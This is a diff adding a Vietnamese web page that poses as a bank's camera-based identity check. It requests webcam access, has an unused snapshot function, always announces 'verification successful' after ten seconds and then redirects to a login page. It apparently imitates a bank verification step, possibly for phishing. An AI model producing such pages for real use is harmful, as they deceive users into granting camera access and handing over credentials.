@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xác thực danh tính qua camera</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .camera-container {
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+
+        video {
+            width: 100%;
+            max-width: 400px;
+            border: 2px solid #ccc;
+            border-radius: 10px;
+        }
+
+        button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            color: white;
+            text-align: center;
+        }
+
+        .popup.show {
+            display: block;
+        }
+
+        p {
+            font-size: 16px;
+            color: #333;
+        }
+
+        footer {
+            margin-top: 20px;
+            font-size: 12px;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Xác thực danh tính qua camera</h2>
+        <p>Vui lòng cấp quyền truy cập camera để quét khuôn mặt của bạn.</p>
+        
+        <div class="camera-container">
+            <video id="video" autoplay></video>
+        </div>
+
+        <button id="startBtn">Chuẩn bị chụp</button>
+
+        <!-- Popup hiển thị thông báo xác thực thành công -->
+        <div id="popup" class="popup">
+            <h3>Xác thực thành công!</h3>
+            <p>Chuyển hướng đến trang đăng nhập...</p>
+        </div>
+
+        <footer>
+            <p>&copy; 2024 Ngân hàng và phát triển</p>
+        </footer>
+    </div>
+
+    <script>
+        const videoElement = document.getElementById('video');
+        const startBtn = document.getElementById('startBtn');
+        const popup = document.getElementById('popup');
+        let captureTimer;
+
+        // Hàm yêu cầu quyền truy cập camera
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: true
+                });
+                videoElement.srcObject = stream;
+            } catch (err) {
+                alert('Không thể truy cập camera: ' + err.message);
+            }
+        }
+
+        // Chụp ảnh (dừng video và tạo hiệu ứng chụp ảnh)
+        function captureImage() {
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            const videoWidth = videoElement.videoWidth;
+            const videoHeight = videoElement.videoHeight;
+            canvas.width = videoWidth;
+            canvas.height = videoHeight;
+            context.drawImage(videoElement, 0, 0, videoWidth, videoHeight);
+            const imageData = canvas.toDataURL('image/png'); // ảnh snapshot dưới dạng base64
+            return imageData;
+        }
+
+        // Hiển thị popup và chuyển trang
+        function showPopupAndRedirect() {
+            popup.classList.add('show');  // Hiển thị popup thông báo
+            setTimeout(() => {
+                window.location.href = "nhap.html";  // Quay lại trang đăng nhập sau 3 giây
+            }, 3000);
+        }
+
+        // Dừng quét sau 10 giây và hiển thị kết quả
+        function stopCameraAfterTimeout() {
+            captureTimer = setTimeout(() => {
+                showPopupAndRedirect();
+            }, 10000);  // Dừng sau 10 giây
+        }
+
+        // Khởi động camera khi nhấn nút
+        startBtn.addEventListener('click', async () => {
+            // Đổi nội dung nút thành "Đang chụp lấy hình..."
+            startBtn.textContent = "Đang chụp lấy hình...";
+
+            // Bắt đầu quay video
+            await startCamera();
+            stopCameraAfterTimeout();  // Bắt đầu đếm ngược 10 giây
+
+            // Sau khi 10 giây hết, đổi lại nội dung nút (nếu muốn)
+            setTimeout(() => {
+                startBtn.textContent = "Chuẩn bị chụp";
+            }, 10000);  // Quay lại sau 10 giây
+        });
+    </script>
+
+</body>
+</html>
